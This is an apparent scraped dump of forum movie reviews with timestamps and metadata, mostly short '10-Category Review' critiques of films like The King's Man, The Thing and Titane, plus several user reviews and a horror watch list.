Furthermore, The Lost Daughter possesses excellent filmmaking from first-time director Maggie Gyllenhaal. Visually, there are many POVs and close-ups, which is very personal. The editing blends the past into the present like a dream. The sound is encompassing and often mixes multiple moments into one. Plus, the music is minimal but reoccurs at key points to emphasize their significance. Overall, it's a potent combination of techniques that unite into a journey so intimate, it feels like a stolen memory. Thanks to Gyllenhaal's focused direction, Colman's raw performance, and the honest script, The Lost Daughter is a triumph.

However, it focuses on slice-of-life moments rather than digging too deep. This allows the actors to express themselves in heartfelt ways across the emotional spectrum. Caitriona Balfe stands out for nailing stirring scenes, but Jude Hill deserves credit for piloting the film at such a young age. Belfast may not provide a groundbreaking narrative, but its sincerity is a worthy supplement.

Meanwhile, the filmmaking of Belfast is rock solid. The production design is convincing, the effects are impactful, and the editing has clever moments. Plus, the sound gets symbolic and silent at key points. Simultaneously, the music consistently elevates the film by capturing both the bittersweet mood and the classic time period. Lastly, the cinematography is the star of Belfast because its shots are composed with suggestion, symbolism, and beauty. Visual symmetry, configuration, and lighting are utilized masterfully to evoke significant emotion. Overall, Kenneth Branagh has directed a superb film that is both sentimental and poignant.

1641140814.0,The King’s Man (2021): 10-Category Review,"The King's Man is an enjoyable ride of action and espionage, packaged with plenty of flavor. This film isn't necessarily outstanding, but it does have enough craft and style to leave viewers satisfied. Like its predecessors, The King's Man is energized by active camerawork, clever editing, potent sound, and abundant effects. Meanwhile, the story is rich with historical fiction, political intrigue, and central family drama. It's an unusual (and occasionally clunky) combination of hyper combat and hyper emotions, but each aspect is treated with care. Thus, The King's Man has a flashy appearance, built on a sturdy foundation. 

Specifically, The King's Man is well paced because it balances story elements and action in interesting doses. It is visually engaging because the camera moves with the action, mixes in various shots (overheads, extreme close-ups, and POVs), and utilizes lighting. The editing is quick during fights, slower during drama, and artistic during transitions. The music and production are stylish takes on the time period. The over-reliance on CGI does undercut the visceral vibe and rugged era, but that's forgivable. Overall, it probably isn't a wide favorite, but The King's Man is a well-rounded flick that's likely to please most audiences.

1641137089.0,Matrix: Resurrections,"I don't post movie reviews very often so when I do you can be damn sure it's because I have something to say. 

I just watched The Matrix: Resurrections. 

I was there in 1999 when film changed forever. When it changed me forever. 
The first Matrix movie was the very meaning of 'seminal'. Every single line of dialogue, every beat of music, every bullet shot etched into my mind. 
To this day I can recount to you every second of that film. As can my friends who joined me on that journey.
The sequels, although not nearly as good, still found a way into my heart. Their action and philosophy created something whole. And they changed the way we see motion pictures. The Marvel movies, as great as they are, must bow down to their projenitor.
This new Matrix however, will never be allowed to rent space in my memory. 

I went in ready. Fists aching to pump the air with excited energy. But they never even closed.
This new one is just... boring. It's an impotent waste of time. And that to me is tragic.
For over 2 hours I was desperately clawing to find something great. Giving it the benefit of the doubt until the credits rolled. And it left me with nothing. 
Void of all that came before it.
How is that possible after 20 years? With all that has been created and imagined in the time since this sequel I expected something great but it just falters at every step.
No great soundtrack, no memorable characters, not even a great action scene. It's a tragic waste of potential that screams of a cash grab of the laziest order.
Am I a bitter old fan that 'just doesn't get it'? No, I don't think so. 
I probably care too much but isn't that the point?
I care about the Matrix. I'm all in when it comes to the philosophy. I'm right there for the action. I want the characters to succeed. 
I thought i could handle 'one little sequel' but no, Lieutenant. This film is already dead.",moviereviews,1882,350,66,0
1641090601.0,New Year’s Eve (2011): 10-Category Review,"New Year's Eve creates the illusion of emotion, yet isn’t an actual journey. Instead of a thorough narrative, New Year's Eve patches cliched vignettes into a jumbo Hallmark movie. This way, it can market an ensemble cast instead of a thoughtful story. Every plotline is shallow: each character’s single trait is introduced, given a minor conflict, and miraculously paid off (usually by finding romance). The arcs are minimally valid, but completely lack substance. The only stance taken here is to overemphasize romance, which is rather toxic. Plus, the acting is generally devoid of passion, which undercuts the idealized relationships.

Meanwhile, the filmmaking of New Year's Eve is basic and formulaic. The visuals are plain, the sound is standard, the music is forgettable, and the editing is lifeless. The production design is slightly impressive at times, but also cheap in other instances. Lastly, the direction is missing a distinct voice or goal outside of emotional manipulation. The project throws empty platitudes and sentimental tricks at its viewers, hoping to compensate for its lack of insight. That might work for some, but others will find it grating. Ultimately, New Year's Eve might feel meaningful, but only provides a mirage.

1640920539.0,RAN (1985) by: Akira Kurosawa - CINEMIN Special Edition - What's the bes...," For this presentation I simply decided to take my 3 copies of the movie Ran (1985) by: Akira Kurosawa and try to show the differences between the supplements and extras that come with each one of them.

 I'm not an expert to talk too much about the technical aspects of each one of them. Actually I judge the 3 with good quality, but of course the new 4K UHD - Lionsgate/Studio Canal beats everyone in this regard. 

However I decided to compare them as they offer a better range of supplements and more comprehensive and informative booklets (probably the Criterion Collection edition is still the best). 

The result is this video presentation with my comments on the 3 editions: Criterion Collection - 2 DVD set discs), Lionsgate/Studio Channel - 1 blu ray disc and again Lionsgate/Studio Channel newest edition 1 4K UHD disc and another 1 blu ray disc . 

Also, much is said about the possibility in the future that the Criterion Colleciton will put on the market a special edition with director Akira Kurosawa's films as it happened in the past: AK 100 - 25 Akira Kurosawa's films - Ran was not in this collection. And I only can hope Ran will be included in another possible collection of this type.  [",moviereviews,1209,214,16,0
1640533795.0,The Tragedy of MacBeth (2021): 10-Category Review,"The Tragedy of MacBeth is a technical marvel. The film is truly high art because the cinematography is impeccable, the production design is captivating, and the audio design is chilling. Together, this creates a mesmerizing journey of light and sound. The tight aspect ratio, stark lighting, and precise framing combine with surreal set compositions to produce a dazzling stream of masterful imagery. Meanwhile, the sound is consistently symbolic and pulsing, evoking motifs of paranoia. All told, the technical aspects of The Tragedy of MacBeth are genuine craftsmanship and serve the spirit of the film in every way.

What's more, The Tragedy of MacBeth is built around classic drama. Staying true to Shakespeare (aside from some savvy streamlining) is always a safe bet. The story captures haunting descents into madness, and the dialogue is hypnotically rhythmic. Denzel Washington is brooding with bursts of rage, and McDormand steals the show as she mentally unravels. Plus, the score is menacing, the transitions are smooth, and the effects are stylistic. From top to bottom, this is a detailed work of art. The Tragedy of MacBeth might not be popcorn entertainment for wide audiences, but it's a perfect storm of skill.

1640443967.0,Gremlins (1984): 10-Category Review,"Gremlins is great family fun. Uniting creativity, excitement, humor and craft, it's a refined piece of 80s pop culture. First, the story is exactly what wide audiences desire. Gremlins has an original plot that merges enjoyable doses of comedy and suspense. The stakes balance audience investment with a lighthearted tone. Plus, the script nails a classic protagonist arc and touches on higher themes about irresponsible consumerism. Next, the designs of the gremlins are flawlessly executed. The mogwai are adorable, and their transformations are creepy yet believable. Undoubtedly, the creatures' looks are central to why Gremlins is so iconic.

Gremlins is driven by its broad sentimental appeal, but it has key technical virtues as well. In particular, the effects, sound, and music contribute to the film's impact. Crucially, the use of puppets and animatronics gives the film a tangible feel that makes it timeless. Meanwhile, the sound drives home the cuteness of the mogwai and sinister gremlins, while also setting the cartoonish tone of the movie. Also, the score is dynamic and amplifies the emotional connection. Combined with a lack of clear weaknesses, Gremlins is an excellent mixture that highlights its strengths and lands as ideal entertainment.

1640268575.0,The Matrix : Resurrections (another corporate s***),"The Matrix 4 is a living proof of not every greatest movie needs a sequel or a remake, it's so disappointing to watch this movie, feels like another great movie captured by the big corporations to squeeze out profits by tampering with our emotions.

The early scenes kinda like self explanatory of how this movie happened, remember that scene when smith tells neo about Warner Bros forcing them to make a sequel to the Matrix trilogy game? and there's more like that.

Why Smith calling neo tom? It's Anderson, they didn't watch the trilogy I suppose.

The Merovingian is a hobo now, wow, kinda foreshadowing how this movie losses it's elegant and classy styles.

Is it so hard to get Tanveer K. Atwal to reprise her role as sati? the answer is yes because we want money and publicity we don't care for our audience, fuck them we can cast Priyanka Chopra cause she's Indian and we can get some more Indian audience with us, well I'm an Indian and I hate her how about that warner bros!

1640021019.0,My Top 5 Movies of the past 5 Years,"1. *Three Billboards Outside Ebbing Missouri* (2017)  
 I'm still salty this one lost best picture to The Shape of Water, but it picked up a slew of other awards and features some of the best acting/character arcs I've seen on screen. The writing and dialogue is phenomenal and the character development is second to none, making for a film that demands a powerful amount of empathy from its audience. Frances McDormand and Sam Rockwell turn in performances equally as stunning and well deserving of the Oscars they received for them. Highly recommend for anyone who hasn't seen. - 8.9/10  
 
2. *Green Book* (2018)  
 Another film where the audience is completely immersed in the performances both Mahershala Ali and Viggo Mortensen put forth, Green Book triumphs in navigating the complexities and unlikely bond between two men from two very different walks of life. While the film embraces many of the cultural stereotypes of the south in the early 1960's, the dialogue and relationship between the main protagonists perfectly navigates the complexities of these stereotypes and how they relate to the individual. Absolute must see. - 8.9/10  
 
3. *Jojo Rabbit* (2019)  
 Director Taika Waititi certainly channeled a Wes Anderson style of filmmaking when creating this comedic masterpiece and it does not fail to deliver. Once again Sam Rockwell delivers a beautiful and carefully crafted performance in his supporting role, but ultimately it is the relationship between the lead protagonists Roman Griffin Davis and Thomasin McKenzie where this film shines brightest. With a script and story so cleverly put together, you will find yourself captivated by the creativity and brilliance littered throughout its performance. This film sews together a perfect amount of irony and drama while providing the audience a hilariously unique point of view from which the story is told. - 8.7/10  
 
4. *Joker* (2019)  
 This is one I had to watch multiple times to really appreciate how well this film is put together and how great Joaquin Phoenix's performance is. This film tackles the daunting task of telling a Joker origin story, and succeeds in creating such a unique identity to a character we've seen adapted so many times before. Joaquin Phoenix's Joker and the film as a whole depict mental illness and society's understanding of it in such a powerful albeit uncomfortable way, and you can't help but appreciate the result they put forth. Not for the feint of heart, but without a doubt worth the watch as well as the praise it received. - 8.4/10  
 
5. *Bohemian Rhapsody* (2018)  
 Such an entertaining film from start to finish. Rami Malek fully immerses himself into the role of Freddie Mercury, although he does not carry the film on his own. The chemistry between the actors on camera along with the spectacular performances we got to see recreated make it hard not to love this one. The audience gets a front row seat on how Freddie Mercury and one of greatest bands ever, Queen, came to be. The film finds just the right balance in highlighting Queen's success as a band as well as peeling back the curtain on the complexities fame and fortune bring the individual. - 8.1/10

1639924685.0,Nightmare Alley (2021): 10-Category Review,"Guillermo del Toro knows how to construct a superior movie. Nightmare Alley is well-crafted in every way. First, the visuals are striking because the lighting, colors, and framing are precise. The camerawork is controlled yet constantly engaged. Next, the sound design is noteworthy because clever J-cuts and voiceovers help strike a mood, plus a ticking watch sound becomes a motif. The production design is equally impressive as it not only sets the time period, but also the gloomy tone. Furthermore, the dynamic editing, evocative effects, and ominous music reinforce a truly atmospheric experience.

Meanwhile, the cast of Nightmare Alley drives the film. Dafoe, Blanchett, Collette, Mara, and Perlman all deliver sturdy support, but it is Bradley Cooper who seals the deal. Cooper provides a layered performance that evolves naturally and expresses significant range. Cooper continues building on his character until the final scene, when all his layers erupt to the forefront. Additionally, the script aids this by carefully setting up the payoff of that finale in more ways than one. Ultimately, because the story is intriguing, the performances are igniting, and the filmmaking is engaging, Nightmare Alley is a trip worth taking.

1639577088.0,Spider-Man Homecoming (2017): 10-Category Review,"Much like its protagonist, Spider-Man: Homecoming is charming. It lacks the filmmaking spark of the Raimi trilogy, but brings enough freshness to be enjoyable in its own right. First, Tom Holland is an excellent Peter Parker and clearly the most believable high-schooler we've had in the role. The writing helps accentuate this by playing up Parker's teenage duties, plights, and perspective. It also helps that this is a coming-of-age story instead of an origin story. Spider-Man is already established; he just doesn't know where he stands as a hero. This creates a Spider-Man arc that feels new and natural.

From a technical standpoint, Spider-Man: Homecoming's inclusion in the MCU is both a blessing and a bind. Marvel Studios has a formula that prevents disaster (like The Amazing Spider-Man 2), but also limits genuine artistry (like Spider-Man 2). The cinematography is adequate, using various mediums, lighting, and camera movement. The soundtrack, casting, and production design dip into the Avengers treasure trove. The special effects are CGI heavy, but mix in practicals too. Plus, the sound design is surprisingly abstract. Altogether, Spider-Man: Homecoming has a strong baseline that is elevated by Holland's charisma, making it a fun spin.

1639164167.0,Godzilla vs. Kong (2021): 10-Category Review,"Godzilla vs. Kong is maximum self-aware schlock. Over the top action and excessive CGI, held together by a ridiculous plot. Yes, the writing is nonsense, but it allows the battles to drive the show. It is a means to an end, and, in that regard, it does its job. This is a microcosm of the overall film. Godzilla vs. Kong is not conventionally good, but its attributes serve its blunt goal of monster fights. The pacing of the first act is too fast? Gotta get to the action. The scientific production design is illogically advanced? Gotta justify these fights. The acting is cheesy? Gotta lighten the tone of this mass destruction.

Meanwhile, Godzilla vs. Kong does bring some filmmaking to the table. The cinematography is solid, using attractive lighting and color choices throughout. The sound design is detailed and occasionally abstract. The CGI is elaborate (despite being overused). The cast isn't amazing but decent, and the direction lacks a distinct voice but keeps the film focused on its energized tone. Overall, Godzilla vs. Kong is certainly aiming low but generally hits its mark. It's far from high art, but Godzilla vs. Kong is fine entertainment.

Did the thematic beats hit for you because I don't think they did for a lot of people; A lot of people have called it Edgar Wright's worst film (or maybe least best lol) but I gotta say I was a huge huge fan of it. 

The hook of an A Nightmare on Elm Street inspired dream fueled time travel horror movie got me instantly - but it went in so much deeper than just that.

1639059288.0,The Amazing Spider-Man 2 (2014): 10-Category Review,"The Amazing Spider-Man 2 is a hot mess. First, the script is a jumble of several stories, haphazardly crammed together. Each plotline is rush and unmotivated, making the film constantly contrived. Peter and Gwen inexplicably breakup and makeup, people become villains for ridiculous reasons, and the backstory of Peter's parents is convoluted and pointless. Furthermore, the combination of these half-baked narratives is worse than each individually because their moods are incompatible and the overall film swiftly becomes tone deaf. Almost instantly, The Amazing Spider-Man 2 devolves into a noisy cluster of visuals rather than a cohesive movie.

Meanwhile, the filmmaking of The Amazing Spider-Man 2 is absent. The imagery is uninspired and ugly, the structureless editing creates emotional whiplash, and the production design is asinine. Garfield and Stone try to salvage the material but clearly have little character instruction. The same goes for the supporting cast, all of whom are lost about what tone to strike. Audiences might hope that the special effects are a saving grace, but even that looks goofy at key moments. Overall, The Amazing Spider-Man 2 tries to do too much and accomplishes nothing, making it a chore to sit though.

1638551250.0,12 Angry Men (1957): 10-Category Review,"12 Angry Men is a hall-of-fame film. Its greatest strength is its renowned script. 12 Angry Men is the quintessential bottle film and still influential today. Because the plot is so contained, it is completely driven by sharp dialogue and precise character development. Meanwhile, small blocking choices (like someone standing up or taking a step) are magnified by the confined location. This might sound off-putting to some viewers, but 12 Angry Men is a masterclass in storytelling. Add in some of the best actors of that era (Fonda, Cobb, and Balsam) and we have a perfect storm. Almost no movie has done more with less. 

Furthermore, 12 Angry Men is fundamental filmmaking. The intentional camera framing and movements deepen the production by subtly suggesting internal character struggles. The expert editing uses minimal cuts to build intimacy and increase potency. The limited music creates a realistic atmosphere. Lastly, the direction is excellent because every aspect is unified to construct an iconic experience. The delicate tone is consistent, the style is concretely mannered, and the whole is greater than the sum of its parts. All in all, 12 Angry Men is a must see for every cinephile and anyone interested in skillful entertainment.

1638384864.0,The Florida Project (2017): 10-Category Review,"A rocky lifestyle presented with delicate care, The Florida Project is as genuine as it is enlightening. Evoking feelings of nostalgia and sincerity, The Florida Project takes its time to display lives of poverty with the utmost humanity. The filmmaking is stripped down, using minimal music, cuts, and camera movement. This allows space for audiences to submerge into the community. Plus, although the techniques are subtle, there is plenty of skill involved. The cinematography is striking because the framing is purposeful and the colors are vibrant. The ambient sound design is realistically filled with impoverished chaos. The editing is hypnotic, steadily drawing viewers in with its methodical pace.

However, despite these strengths, the centerpiece of the experience is the acting. The script is illuminating but the performances elevate that immaculate material. The cast is a genius combination of seasoned veterans (Willem Dafoe) and authentic newcomers (Brooklynn Prince and Bria Vinaite), all of whom feel real enough to touch. This creates an intimate atmosphere that leaves a powerful impression. In the end, it is clear that Sean Baker had a passionate vision and an important story to tell, making The Florida Project a cinematic triumph and a meaningful experience.

1637968679.0,"""House of Gucci"" (2021) (No Spoilers)","This is my first time, trying to write a film review, so I hope you enjoy it.


Director Ridley Scott, knocks it out of the park once again, with his latest Picture ""House of Gucci"" (2021). R. Scott released two films this year, although, it's stronger, than his previous film this year ""The Last Duel"", which released last month, it still has it's flaws. Here's my review:


""House of Gucci"", is a film about the real life story of the Gucci family. It follows Maurizio Gucci (Adam Driver) and his story of rise, fame, glory and tragedy. The film also features Patrizia Reggiani (Lady Gaga), Aldo Gucci (Al Pacino), Rodolfo Gucci (Jeremy Irons) and Paolo Gucci (Jared Leto), as they play a big part in the story about their family and how it became, what it is today.


The film has a runtime of about 160 minutes (2hrs 40min), which is longer than your average 'biopic'. The first and mostly second acts of the film are very strong, but at about the halfway point of the film, the runtime really starts to take a toll on you. Even though, the third act has the most important scenes of the whole film, it felt like the runtime, could have been reduced by about 20 minutes, if a few unnecessary scenes were cut from the film.


The performances from the cast were great, but Adam Driver and Jared Leto shine and stand out the most. Very close, but not quite there yet, were the performances of Al Pacino and Lady Gaga. In my opinion, this is Driver's second best performance of his career, after Noah Baumbach's ""Marriage Story"" (2019), for which he got his first Academy Award nomination, for the Best Actor in a Leading Role. And I wouldn't be surprised if either Driver or Leto, get a nomination at next year's Academy Awards.Lady Gaga is also a good contender for the Academy Award next year.


The cinematography of the film was pretty good, even though, it didn't get a lot of attention, mostly because the film is very character centered. My only complain about it was, that at times the film felt very dark, like there wasn't enough brightness. I mostly felt it during the scenes in the beginning of the film. It felt dark, even when they were outside on an afternoon. (It only may have been a specific theatre issue)


The set production and art designs were good. Everything felt so extravagant, from sofas to lamps. Costumes were amazing, especially during the fashion show scenes. The main characters costumes also looked awesome, and let them to look fancy all the time. Makeup was also extraordinary. Jared Leto, had a full-on face mask on, to look older. Most of the time, you couldn't even tell, that it was actually him playing the role. The score was good, but nothing exceptional.


Overall, the film is great, a bit too long, but great. The cast's performances, set and makeup production made up for the film's few pointless scenes. This is nowhere near to being one of Ridley Scott's best films, but it for sure is one of his stronger entries to his directorial library of films. I don't think, that it will get nominated for Best Picture. But I strongly believe, that it will get a nomination in Best Art Direction, Costume Design and Makeup categories. And it might even get a nomination for Best Adapted Screenplay.


I'd recommend this film to people, who are interested in fashion, history of how things came to be today or just love a good ol' fashioned drama.

1637861041.0,Pilgrim (2019): 10-Category Review,"Stuffed with incompetence and glazed in schlock, Pilgrim is downright nonsensical. Clearly, its silly premise came first and the writing was clumsily forced around that. The story goes nowhere, repeating itself like a 30 minute episode stretched into a full length film. Meanwhile, the acting is corny. The cast of no-names struggles to meet the paltry material. Whether it comes from the script or the performances, everything about the characters is painfully contrived. Their cheesy qualities and relationships are obnoxiously blunt.

On the bright side, the technical aspects of Pilgrim are surprisingly decent. The camerawork has some spice and creativity (although, there is an overuse of wide-angle lenses). The editing is overdone but its energy is respectable. The sound design is also exploited for canned jump scares, but moments of abstract mood-setting propel that aspect to a relative strength. However, this faint praise is hardly a gravy train. The soundtrack is still tiresome, the production design is stale, and the direction feels unfocused because the project never exhibits a specific tone or mission. As art or entertainment, Pilgrim is more famine than feast.

1636822880.0,Red Notice (2021): 10-Category Review,"The only clear positive of Red Notice is its cast. Johnson, Reynolds, and Gadot are interesting draws, which only highlights how disappointing the rest of the movie is. A production that snagged three A-listers would hopefully possess more substance. Red Notice isn't necessarily bad but it definitely isn't good. It simultaneously looks like an expensive blockbuster and a cheap knockoff. The decent CGI is grossly overused, smothering every action scene in inauthenticity. This artificiality extends to the production design as well. Red Notice tries to be global and elaborate, but is failed by limited sets that shrink the world it attempts to construct.

Meanwhile, although the cast is famous, their acting is underwhelming. Gadot is wooden and Reynolds' constant quips are downright annoying. Johnson plays his usual role, which isn't much but is fine. Perhaps this is because the material is largely uninspiring. There is a twist that keeps the script from being completely unoriginal, but that only helps so much. In the end, this all adds up to a film that is shallow in every sense. Red Notice may be easy to advertise but is totally void of craft.

1635881381.0,Antlers (2021): 10-Category Review,"Antlers is ambitious but fails to come together. There is plenty to appreciate here but, unfortunately, it is less than the sum of its parts. The story is interesting, using creature horror to mirror family trauma, and the acting meets that material. Keri Russell, Jesse Plemons, and Jeremy Thomas (a child actor) all fill out complex characters in a gloomy world. The pacing is methodical, creating mystery and suspense. The imagery is bleak and somber, applying darkness and muted colors. Lastly, the design and effects are especially nice. The monster is mostly shrouded, but what's shown is creepy and unique.

However, Antlers doesn't land as a great film because none of this synergizes into something more. The family drama juxtaposes well with the monster, but those themes don't intertwine enough. Our protagonist is compelling, but she doesn't have a character arc that connects with her baggage. The fascinating monster has some built-in environmental messages, but none of that is explored or related to our protagonists. Sadly, this all leaves the movie feeling like a collection of attractive pieces. The filmmaking is engaging and its intentions are admirable, but, ultimately, Antlers is a bit of a let down.

1635619744.0,A list of horror movies I watched,"Here is the list of horror movies i have watched this year.


Hell House LLC- A absolute fucking gem of a movie. This found-footage-style movie scared the shit out of me. There were plenty of times when I was freaking out, which I don't usually do. Like legit stressing out and scared shitless. I fucking loved this movie and highly recommend it. 9/10 

 

Dead Silence: James Wan sucked dick in between Saw and The Conjuring. This constantly bleak-looking movie sucked. You know a movie is a trash when it involves ventriloquism. Anyways this movie is not good at all. It's dumb and poorly acted. Wan tries his best to make this enjoyable, but he can't quite pull it off. 4/10 

 

Sleepaway Camp: A fun early-era slasher film. A few solid kills and terrible acting. So slasher movie 101 stuff. The ending was both fucked up and funny at the same time. It's a solid movie overall. 7.5/10

 

Slither: The start to James Gunn's greatness as a director. A bizarre alien/zombie hybrid movie. Nathan Fillion and Michael Rooker are both excellent. A fun film that doesn't disappoint. 8.8/10


 Trick r Treat- I forgot how much this movie ruled. All four mini-stories are all so god damn great. There is some decent gore throughout the whole thing. All four stories are intertwined together so well. Each of them encompasses the essence of all the different horror subgenres. At no point does it take itself too seriously, and it's a fun ride. 8.9/10 


Cabin in the Woods: Yet another great movie that was written so damn well. Similar to Scream, this pokes fun of horror while being better than most of them. The main reason for that is the work of Richard Jenkins and Bradley Whitford. These two bring so much humor to this movie. No one could have played these characters as they did. This movie nailed its casting. My man-crush Chris Hemsworth kills it as the jock. The pot dude was super annoying, and I got sick of him but outside of that, this movie is excellent. 9/10 

Prince of darkness

This may be a mediocre movie, but the music in it is hypnotic. Then again, you could say that it's the case for most of Carpenter's movies. Overall this movie is a weird one that is a bit overambitious. It's got the devil trapped in a container, some weird other super demon in another dimension, and it hints at some time travel shenanigans. It's a middle-of-the-road movie that you could probably skip. 5/10


Shocker

This is sort of a sleeper movie when it comes to Wes craven. It's got some creative kills. It's a fun movie with a high entertainment value behind it. Dude, if you don't find a little girl swearing and trying to kill a dude with a Bulldozer, then you need to reevaluate your life. Mitch Pileggi is the main reason this movie is so fun. He is outstanding as Horace pinker, and I want more films of this character. The final fight between Horace and Peter berg as they travel through the TV was really good. The main flaws with this movie are that Peter berg is garbage in the lead role, the ending goes on forever, and it's disjointed at times. Even with the major flaws, this movie can be a fun ride at times.6.9/10",moviereviews,3130,560,88,0

1635033331.0,The Thing (1982): 10-Category Review,"John Carpenter's The Thing is the quintessential bottle movie. Set in remote Antarctica, The Thing illustrates paranoia and isolation. This is achieved effectively because the pacing is methodical and deliberate. The tension builds patiently. So when excitement does erupt, it is cathartic and earned. The editing contributes here with prolonged takes and fades to black, evoking an atmosphere of exhaustion. Yet, it is the careful writing that is the driving force behind this mood. Each actor utilizes the chilling script and displays his own form of anxiety as the walls close in. The haunting music and ominous sound design are cherries on top.

Nevertheless, the special effects are the main event of The Thing. The grotesque alien transformations are both horrifying and incredible to witness. They are stunning specifically because they are done practically. In an era before CGI could do anything and everything, physical craftsmanship constructed these mesmerizing effects. Each shot presents a new contraption that highlights a step in the metamorphosis. This film is worth a watch for these visuals alone. Still, it's the captivating story and skillful presentation that solidify The Thing as a certified classic.

1634843793.0,Scary Movie 4 (2006): 10-Category Review,"Scary Movie 4 has no respect for its audience. There are no jokes in the movie, just people getting hurt and sexual references. Sure, those topics can be funny, but there needs to be setup or cleverness involved to make a legitimate gag. Meanwhile, the broader story is equally absent because it's a collection of references to other movies rather than an independent narrative. Many scenes are shoehorned in, making this feel like a sketch show instead of a film. Spoofing is already a low form of comedy, but Scary Movie 4 doesn't even play off of its source material. It only references them as if that alone is funny or entertaining.

On top of all this, Scary Movie 4 is as cheap as can be. The special effects, makeup, and costumes are not even trying. Everything looks like a knockoff SNL skit. It's surprising that they got cameos for this production because it's an embarrassment. Clearly, this was made by scam artists who were more interested in grifting audiences than actual entertainment. Overall, Scary Movie 4 is a pathetic pile of garbage that is insulting to anyone who views it. Stay far away.

1634656280.0,Mars Attacks! (1996): 10-Category Review,"Although it isn't often discussed, Mars Attacks! is one of Tim Burton's best films. This is because it has the budget for all his creativity, yet isn't so preoccupied with image that it loses relatability. The story of an alien invasion is classic and ambitious, but there is enough heart peppered throughout the script to keep everything grounded. Meanwhile, the movie is very funny and stylish in ways that suit Burton best. Mars Attacks! has a distinct retro-futuristic production design that Burton brings to life and makes the film unique.

The look of everything is fantastic but it is the star-studded cast that is the most eye-catching. Mars Attacks! is filled with bona fide A-listers like Jack Nicholson and up-and-comers like Jack Black. Additionally, the score perfectly captures the nostalgic homage of the movie, and the special effects are an excellent blend of CGI and practical (which synergize well). This helps unify the outrageous supernatural with the emotional accessibility. Balancing camp is always a tough act but Mars Attacks! nails it flawlessly. Appropriate doses of humor and vulnerability, thorough vision, and skilled craftsmanship make this a movie for all audiences.

1634400606.0,The Last Duel (2021): 10-Category Review,"The Last Duel is a well-rounded film that hits lofty marks while being unique enough to stand out from its genre. First and foremost, Jodie Comer is magnificent for portraying her character slightly (yet thunderously) different depending on the perspective of the narrator. The remaining cast members nail their roles as well. Matt Damon, Adam Driver, and Ben Affleck deliver expectedly great work, but minor characters like Alex Lawther and Harriet Walter also provide flavor to the experience. Fortunately, this all serves an honorable script that is interesting, ambitious, and meaningful. Stories are rarely so fantastical and so relevant at the same time.

Meanwhile, The Last Duel is a technical beast. Ridley Scott is known for his extravagant movies and that continues here. The production design shines as this film's greatest strength because it is exceptionally tangible and immersive. The fact that The Last Duel was actually filmed in historic French locations goes a very long way. Additionally, the sound design is rich, the cinematography is epic (utilizing motion, weather, and color tones), and the music is captivating. Truly, The Last Duel is a film without weakness that is bound to capture all audiences.

One of the best adaptations of a book.  
And oh my god the journey. It gives you all the things you did not ask for. You are uncomfortable, disgusted, mad, happy, miserable.

1633359228.0,The Addams Family 2 (2021): 10-Category Review,"Movies targeted towards children are often basic, cheap, and pointless. The Addams Family 2 is a prime example. While this production markets familiar characters with interesting traits, they are woefully underutilized. Many problems plague this film but the most glaring issue is the lack of a clear goal. Yes, there is an overarching plot that contemplates the meaning of family, but that is forced and formulaic. Meanwhile, several scenes are detours that contribute nothing to that larger narrative. Consequently, the story is a stale patchwork that reduces our beloved characters to bystanders in their own movie.

Beyond that, The Addams Family 2 offers very little from a filmmaking perspective. The cinematography is occasionally interesting but hardly redeeming. The editing is underdone (likely due to scant material). The soundtrack is just wrong because it prioritizes contemporary pop over setting a specific tone. The production design is surprisingly bland for a film about such stylish characters. Lastly, the CGI looks cheap, lacking the detail of current animated movies. This all gives The Addams Family 2 a hollow and generic feel that undercuts whatever slight impact it could've had. Undoubtedly, this is a film worth skipping.

1633195836.0,Titane (2021): 10-Category Review,"Buckle up. Titane is a wild ride that will have many viewers confused about how to feel. However, underneath that confusion, there will be a sense of emotional enlightenment that transcends the conventional moviegoing experience. While this film is certainly weird and foreign, its core is oddly simple: unconditional love can transform even the most monstrous hearts. The fact that this message is packaged in such an uncomfortable narrative makes it all the more powerful. The uglier the situation gets, the more beautiful that love becomes. Through extreme juxtaposition, Titane is both disturbing and tender.

Meanwhile, the filmmaking of Titane is absolutely stunning. Every image is cinematic, filled with intentional colors and spacing that create a visceral experience. The sound design is ominous and vivid. The soundtrack is energized, whimsical, and atmospheric without being overpowering. Yet it is the acting of Agathe Rousselle and Vincent Lindon that grounds the production. Both actors bring immense complexity to their roles while remaining subtle and understated. Lindon's longing performance, in particular, is sure to evoke deep emotion. Ultimately, Titane is a film that few will expect but all will be impacted by.

1633112430.0,Venom: Let There Be Carnage (2021): 10-Category Review,"Venom: Let There Be Carnage is a one trick pony that doesn't land its trick. The entire movie is filler stalling for its final battle, yet that showdown is disappointing. Yes, it is between two marketable comic book characters, but that's all it provides. The villain is underdeveloped and uninteresting, the imagery is sloppy and cluttered, and the choreography is nonsensical. Because there is no coherent style or vision, the sequence ends up being a big, ugly mess. Normally, the details of an action sequence wouldn't be so significant, but that's all this film invests in.

Everything about the story is rushed, repetitive, and uninspired. There are no intimate moments to allow things sink in because the script lacks substance worth meditating on. The humor is okay at times, Tom Hardy is talented enough to have chemistry with himself, and effort went into the CGI (though it was overused). However, besides that, this production is pointless. Even the violence is unsatisfyingly suppressed for that PG-13 rating. Undoubtedly, some fanboys will be content with a mediocre fight between two characters they recognize, but as a film, Venom: Let There Be Carnage is a noisy pile of nothing.

1632789255.0,X-Men: Dark Phoenix [Review]," Today I'd like to let you know my review for the fourth film of the X-men fist class saga: Dark Phoenix. Despite the success of X-men first class, due to being a fresh proposal with high quality actors, who did their best to raise their character even more. We have to unfortunately admit the other movies were lowering the level until we got to the last movie.

In Dark Phoenix we see how the young adult Jean Grey is affected by an energy in the universe which enhanced her powers after a mission in the space goes wrong, this energy makes a not so passive Jean emerge from her interior, making her remember events from her past that Charles repressed. We see how Jean cannot control control her anger against the professor to the point of hurting innocents. Turning her into the ""villain."" However, we see the extraterrestrial race D' Bari appear who seek to dominate the planet after the lose of their due to this energy now within Jean's body. After several fights and explosions, with the help of Charles and Magneto, Jean remembers the value of family and end up sacrificing herself to save the world.

Well, there are several problems with this movie. In first place, Jean's character was not developed enough to star her own story. In addition, we see the premature death of Mystique, the disunity of the X-men when they found out what the professor did with Jane (which in my opinion was kind of justified). Being the true ""villains"" the D'Bari, their participation was not that relevant.

If I have to say something positive would be the story, the whole drama of this girl with psychic mutants powers who accidentally murdered her mother, who later discovers she was deceived by both father figures in her life, is interesting. But overall. It did not work.

White rate. **5.00**

The small amount I knew about famed British criminal, Charlie Bronson, was completely reinforced in this amazing walk through of his life. I was extremely informative and I would recommend this film to a multitude of people, it was the perfect mix of interesting and disturbing to make for a great watch. 

